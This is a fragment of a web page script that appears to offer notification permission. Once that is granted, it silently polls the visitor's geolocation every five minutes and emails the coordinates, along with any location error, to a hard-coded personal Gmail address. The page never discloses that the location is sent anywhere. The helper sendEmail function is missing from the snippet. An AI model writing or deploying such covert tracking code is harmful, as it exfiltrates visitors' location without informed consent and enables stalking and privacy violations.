    <!-- JavaScript for Geolocation, Notifications, and Email Sending -->
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const locationDisplay = document.getElementById("locationDisplay");
            let latitude, longitude;

            // Request Notification and Geolocation Permissions on Button Click
            document.getElementById("permissionButton").addEventListener("click", function () {
                // Request notification permission
                if ("Notification" in window) {
                    Notification.requestPermission().then(permission => {
                        if (permission === "granted") {
                            alert("Notifications enabled!");
                            startLocationUpdates();
                        } else {
                            alert("Notifications disabled.");
                        }
                    });
                } else {
                    alert("Notifications are not supported by your browser.");
                }
            });

            // Start location updates every 5 minutes (300000 ms) after permissions are granted
            function startLocationUpdates() {
                if ("geolocation" in navigator) {
                    setInterval(() => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                latitude = position.coords.latitude;
                                longitude = position.coords.longitude;
                                locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;

                                // Send location data email periodically
                                sendEmail("Location Update", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                            },
                            (error) => {
                                locationDisplay.textContent = error.code === error.PERMISSION_DENIED ? "Location access denied by user." : "Location error.";
                                sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
                            }
                        );
                    }, 300000); // 5 minutes interval
                } else {
                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
                }
            }
        });
